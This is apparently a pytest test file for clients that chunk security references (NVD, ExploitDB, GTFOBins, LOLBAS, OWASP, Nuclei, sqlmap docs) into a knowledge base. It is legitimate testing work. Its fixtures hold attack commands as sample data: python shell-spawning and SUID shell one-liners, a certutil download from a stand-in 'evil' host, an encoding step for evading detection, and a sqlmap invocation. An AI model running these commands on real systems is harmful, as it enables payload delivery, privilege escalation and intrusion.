import pytest
from knowledge_base.curation.tool_docs_client import ToolDocsClient
from knowledge_base.curation.gtfobins_client import GTFOBinsClient
from knowledge_base.curation.lolbas_client import LOLBASClient
from knowledge_base.curation.owasp_client import OWASPClient
from knowledge_base.curation.nuclei_client import NucleiClient
from knowledge_base.curation.nvd_client import NVDClient
from knowledge_base.curation.exploitdb_client import ExploitDBClient

REQUIRED_FIELDS = {"chunk_id", "content", "title", "source"}


def assert_chunk_valid(chunk: dict, expected_source: str):
    """Verify a chunk dict has all required fields."""
    missing = REQUIRED_FIELDS - set(chunk.keys())
    assert not missing, f"Missing fields: {missing}"
    assert chunk["source"] == expected_source, f"Expected source={expected_source}, got {chunk['source']}"
    assert chunk["content"].strip(), "Content is empty"
    assert isinstance(chunk["chunk_id"], str) and len(chunk["chunk_id"]) > 0
    assert isinstance(chunk["title"], str)


class TestNVDClient:

    @pytest.fixture
    def sample_cve_normalized(self):
        """A normalized CVE dict (post _normalize_cve())."""
        return {
            "cve_id": "CVE-2021-44228",
            "description": "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.",
            "cvss_score": 10.0,
            "severity": "critical",
            "affected_products": ["cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*"],
            "published_date": "2021-12-10",
        }

    def test_to_chunks_produces_valid_chunk(self, sample_cve_normalized):
        client = NVDClient()
        chunks = client.to_chunks([sample_cve_normalized])

        assert len(chunks) == 1
        chunk = chunks[0]
        assert_chunk_valid(chunk, "nvd")
        assert chunk["cve_id"] == "CVE-2021-44228"
        assert chunk["cvss_score"] == 10.0
        assert chunk["severity"] == "critical"
        assert "Log4j2" in chunk["content"]

    def test_normalize_cve_from_api_response(self):
        """Test parsing a raw NVD API v2.0 response."""
        client = NVDClient()
        sample_vuln = {
            "cve": {
                "id": "CVE-2024-12345",
                "descriptions": [
                    {"lang": "en", "value": "Test vulnerability description"}
                ],
                "metrics": {
                    "cvssMetricV31": [
                        {"cvssData": {"baseScore": 8.5, "baseSeverity": "HIGH"}}
                    ]
                },
                "configurations": [
                    {"nodes": [{"cpeMatch": [{"criteria": "cpe:2.3:a:vendor:product:*"}]}]}
                ],
                "published": "2024-01-15T00:00:00.000",
            }
        }
        result = client._normalize_cve(sample_vuln)
        assert result["cve_id"] == "CVE-2024-12345"
        assert result["cvss_score"] == 8.5
        assert result["severity"] == "high"
        assert result["published_date"] == "2024-01-15"

    def test_chunk_id_determinism(self, sample_cve_normalized):
        client = NVDClient()
        chunks1 = client.to_chunks([sample_cve_normalized])
        chunks2 = client.to_chunks([sample_cve_normalized])
        assert chunks1[0]["chunk_id"] == chunks2[0]["chunk_id"]


class TestExploitDBClient:

    @pytest.fixture
    def sample_rows(self):
        return [
            {
                "id": "51234",
                "description": "Apache Struts 2 - REST Plugin XStream RCE (CVE-2017-9805)",
                "date_published": "2017-09-12",
                "platform": "linux",
                "type": "remote",
                "port": "8080",
            },
            {
                "id": "49757",
                "description": "vsftpd 2.3.4 - Backdoor Command Execution",
                "date_published": "2021-05-10",
                "platform": "unix",
                "type": "remote",
                "port": "21",
            },
        ]

    def test_to_chunks_produces_valid_chunks(self, sample_rows):
        client = ExploitDBClient()
        chunks = client.to_chunks(sample_rows)

        assert len(chunks) == 2
        for chunk in chunks:
            assert_chunk_valid(chunk, "exploitdb")

    def test_cve_extraction(self, sample_rows):
        client = ExploitDBClient()
        chunks = client.to_chunks(sample_rows)

        # First row contains CVE-2017-9805
        assert chunks[0]["cve_id"] == "CVE-2017-9805"
        # Second row has no CVE
        assert chunks[1]["cve_id"] is None

    def test_metadata_fields(self, sample_rows):
        client = ExploitDBClient()
        chunks = client.to_chunks(sample_rows)

        assert chunks[0]["edb_id"] == "51234"
        assert chunks[0]["platform"] == "linux"
        assert chunks[0]["exploit_type"] == "remote"

    def test_chunk_id_determinism(self, sample_rows):
        client = ExploitDBClient()
        chunks1 = client.to_chunks(sample_rows)
        chunks2 = client.to_chunks(sample_rows)
        assert chunks1[0]["chunk_id"] == chunks2[0]["chunk_id"]
        assert chunks1[1]["chunk_id"] == chunks2[1]["chunk_id"]


class TestGTFOBinsClient:

    @pytest.fixture
    def sample_md(self):
        return """---
functions:
  shell:
    - description: It can be used to break out from restricted environments.
      code: python -c 'import os; os.system("/bin/sh")'
  suid:
    - description: Runs with the SUID bit set.
      code: |
        ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
  file-read:
    - description: Reads data from files.
      code: python -c 'print(open("file_to_read").read())'
...
"""

    def test_parse_md(self, sample_md):
        client = GTFOBinsClient()
        parsed = client._parse_gtfobins_md("python", sample_md)
        assert parsed is not None
        assert parsed["binary_name"] == "python"
        assert len(parsed["functions"]) == 3
        function_types = {f["type"] for f in parsed["functions"]}
        assert function_types == {"shell", "suid", "file-read"}

    def test_to_chunks_one_per_function(self, sample_md):
        client = GTFOBinsClient()
        parsed = client._parse_gtfobins_md("python", sample_md)
        chunks = client.to_chunks([parsed])

        assert len(chunks) == 3
        for chunk in chunks:
            assert_chunk_valid(chunk, "gtfobins")
            assert chunk["binary_name"] == "python"
            assert chunk["function_type"] in {"shell", "suid", "file-read"}
            # Content no longer carries the "GTFOBins:" source-label prefix
            # (the source is on the chunk as a property and as a Neo4j
            # label). The semantic header is now "{binary} — {func_type}".
            assert "python — " in chunk["content"]
            assert chunk["function_type"] in chunk["content"]

    def test_chunk_id_determinism(self, sample_md):
        client = GTFOBinsClient()
        parsed = client._parse_gtfobins_md("python", sample_md)
        chunks1 = client.to_chunks([parsed])
        chunks2 = client.to_chunks([parsed])
        ids1 = sorted(c["chunk_id"] for c in chunks1)
        ids2 = sorted(c["chunk_id"] for c in chunks2)
        assert ids1 == ids2

    def test_dash_dash_frontmatter_format(self):
        """Some GTFOBins files use Jekyll-style --- ... --- frontmatter."""
        client = GTFOBinsClient()
        content = """---
functions:
  shell:
    - code: bash -c 'sh'
---
"""
        parsed = client._parse_gtfobins_md("bash", content)
        assert parsed is not None
        assert len(parsed["functions"]) == 1


class TestLOLBASClient:

    @pytest.fixture
    def sample_yaml(self):
        return """
Name: Certutil.exe
Description: Certificate utility
Commands:
  - Command: certutil.exe -urlcache -split -f http://evil/payload.exe
    Description: Download file from URL
    Usecase: Download arbitrary file
    Category: Download
    MitreID: T1105
  - Command: certutil.exe -encode input output
    Description: Encode file to Base64
    Usecase: Evade detection
    Category: Encode
    MitreID: T1027
"""

    def test_parse_yaml(self, sample_yaml):
        client = LOLBASClient()
        parsed = client._parse_lolbas_yaml(sample_yaml)
        assert parsed["name"] == "Certutil.exe"
        assert len(parsed["commands"]) == 2

    def test_to_chunks_one_per_command(self, sample_yaml):
        client = LOLBASClient()
        parsed = client._parse_lolbas_yaml(sample_yaml)
        chunks = client.to_chunks([parsed])

        assert len(chunks) == 2
        for chunk in chunks:
            assert_chunk_valid(chunk, "lolbas")
            assert chunk["binary_name"] == "Certutil.exe"

    def test_metadata_fields(self, sample_yaml):
        client = LOLBASClient()
        parsed = client._parse_lolbas_yaml(sample_yaml)
        chunks = client.to_chunks([parsed])

        assert chunks[0]["category"] == "Download"
        assert chunks[0]["mitre_id"] == "T1105"
        assert chunks[1]["category"] == "Encode"
        assert chunks[1]["mitre_id"] == "T1027"

    def test_chunk_id_determinism(self, sample_yaml):
        client = LOLBASClient()
        parsed = client._parse_lolbas_yaml(sample_yaml)
        chunks1 = client.to_chunks([parsed])
        chunks2 = client.to_chunks([parsed])
        ids1 = [c["chunk_id"] for c in chunks1]
        ids2 = [c["chunk_id"] for c in chunks2]
        assert ids1 == ids2


class TestOWASPClient:

    @pytest.fixture
    def sample_doc(self):
        return {
            "filename": "05-Testing_for_SQL_Injection.md",
            "category": "Input Validation Testing",
            "test_id": "WSTG-INPV-05",
            "content": """# Testing for SQL Injection

## Summary
SQL injection allows attackers to interfere with queries.

## Test Objectives
Identify SQL injection points in the application.

## How to Test
Send SQL metacharacters and observe the response.
""",
        }

    def test_to_chunks_splits_on_headers(self, sample_doc):
        client = OWASPClient()
        chunks = client.to_chunks([sample_doc])

        assert len(chunks) > 0
        for chunk in chunks:
            assert_chunk_valid(chunk, "owasp")

    def test_test_id_propagated(self, sample_doc):
        client = OWASPClient()
        chunks = client.to_chunks([sample_doc])

        assert all(c["test_id"] == "WSTG-INPV-05" for c in chunks)

    def test_category_propagated(self, sample_doc):
        client = OWASPClient()
        chunks = client.to_chunks([sample_doc])

        assert all(c["category"] == "Input Validation Testing" for c in chunks)

    def test_test_id_extraction_from_content(self):
        client = OWASPClient()
        content = "# Testing\n\nThis is WSTG-AUTH-03 testing."
        test_id = client._extract_test_id(content, "test.md")
        assert test_id == "WSTG-AUTH-03"


class TestNucleiClient:

    @pytest.fixture
    def sample_template(self):
        return {
            "id": "CVE-2021-44228",
            "name": "Apache Log4j RCE",
            "severity": "critical",
            "tags": ["cve", "rce", "log4j", "apache"],
            "cve_ids": ["CVE-2021-44228"],
            "protocol": "http",
        }

    def test_to_chunks_produces_valid_chunk(self, sample_template):
        client = NucleiClient()
        chunks = client.to_chunks([sample_template])

        assert len(chunks) == 1
        chunk = chunks[0]
        assert_chunk_valid(chunk, "nuclei")
        assert chunk["template_id"] == "CVE-2021-44228"
        assert chunk["severity"] == "critical"
        assert "rce" in chunk["tags"]

    def test_normalize_template_extracts_cves_from_tags(self):
        client = NucleiClient()
        raw = {
            "id": "test-template",
            "info": {
                "name": "Test",
                "severity": "high",
                "tags": "cve,rce,CVE-2023-12345",
            },
            "type": "http",
        }
        normalized = client._normalize_template(raw)
        # The field was renamed from `cve_ids` to `codes` — it's now a
        # unified list of identifier strings that includes CVE-*, CWE-*,
        # etc. The singular `cve_id` is the first CVE in that list
        # (mirrors the ExploitDB/NVD pattern for index compatibility).
        assert "CVE-2023-12345" in normalized["codes"]
        assert normalized["cve_id"] == "CVE-2023-12345"

    def test_chunk_id_determinism(self, sample_template):
        client = NucleiClient()
        chunks1 = client.to_chunks([sample_template])
        chunks2 = client.to_chunks([sample_template])
        assert chunks1[0]["chunk_id"] == chunks2[0]["chunk_id"]


class TestToolDocsClient:

    @pytest.fixture
    def sample_doc(self):
        return {
            "filename": "sqlmap.md",
            "category": "tool",
            "tool_name": "sqlmap",
            "subdir": "tooling",
            "content": """---
name: sqlmap
description: SQL injection testing tool
---

# sqlmap CLI Playbook

## High-signal flags

- `-u <url>` target URL
- `--batch` non-interactive mode
- `--level <1-5>` test depth

## Common patterns

Run baseline test:
`sqlmap -u "http://target" -p id --batch`
""",
        }

    def test_to_chunks_strips_frontmatter(self, sample_doc):
        client = ToolDocsClient()
        chunks = client.to_chunks([sample_doc])

        assert len(chunks) > 0
        for chunk in chunks:
            assert_chunk_valid(chunk, "tool_docs")
            assert "---" not in chunk["content"][:10]  # frontmatter stripped

    def test_tool_name_set(self, sample_doc):
        client = ToolDocsClient()
        chunks = client.to_chunks([sample_doc])
        assert all(c["tool_name"] == "sqlmap" for c in chunks)

    def test_section_set(self, sample_doc):
        client = ToolDocsClient()
        chunks = client.to_chunks([sample_doc])
        assert all("section" in c for c in chunks)

    def test_extract_name_from_frontmatter(self):
        client = ToolDocsClient()
        content = "---\nname: my-tool\ndescription: test\n---\n# Doc"
        name = client._extract_name(content, "fallback")
        assert name == "my-tool"

    def test_extract_name_fallback(self):
        client = ToolDocsClient()
        content = "# Just a markdown file"
        name = client._extract_name(content, "my_tool")
        assert name == "my tool"  # underscores → spaces


class TestClientInvariants:
    """Tests that apply to all clients."""

    def test_all_chunks_have_required_fields(self):
        """Every client must produce chunks with the standard required fields."""
        cases = [
            (NVDClient(), [{"cve_id": "CVE-1", "description": "test", "cvss_score": 8.0, "severity": "high", "affected_products": [], "published_date": "2024-01-01"}], "nvd"),
            (ExploitDBClient(), [{"id": "1", "description": "test", "date_published": "2024", "platform": "linux", "type": "remote", "port": ""}], "exploitdb"),
            (NucleiClient(), [{"id": "test", "name": "Test", "severity": "high", "tags": [], "cve_ids": [], "protocol": "http"}], "nuclei"),
        ]

        for client, raw, source in cases:
            chunks = client.to_chunks(raw)
            assert len(chunks) > 0, f"{source}: no chunks produced"
            for chunk in chunks:
                assert_chunk_valid(chunk, source)

    def test_chunk_ids_unique_within_source(self):
        """Chunk IDs should be unique for distinct content in the same source."""
        client = NVDClient()
        raw = [
            {"cve_id": "CVE-2024-1", "description": "test 1", "cvss_score": 8.0, "severity": "high", "affected_products": [], "published_date": "2024-01-01"},
            {"cve_id": "CVE-2024-2", "description": "test 2", "cvss_score": 9.0, "severity": "critical", "affected_products": [], "published_date": "2024-01-02"},
        ]
        chunks = client.to_chunks(raw)
        ids = [c["chunk_id"] for c in chunks]
        assert len(ids) == len(set(ids)), "Duplicate chunk IDs"
